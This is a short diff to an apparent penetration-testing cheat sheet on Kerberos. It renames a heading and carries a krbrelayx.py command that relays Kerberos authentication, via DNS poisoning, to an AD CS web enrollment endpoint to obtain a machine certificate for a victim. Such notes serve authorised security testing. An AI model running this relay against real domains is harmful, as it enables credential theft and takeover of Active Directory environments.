@@ -2,7 +2,7 @@
 
 % kerberos
 
-## Kerberos relay - Abuse from DNS poisoning
+## Kerberos relay - Abuse from DNS poisoning step 1
 ```sh
 krbrelayx.py --target http://<ADCS_FQDN>/certsrv/ -ip <ATTACKER_IP> --victim <TARGET_SAMNAME> --adcs --template <Machine>
 ```
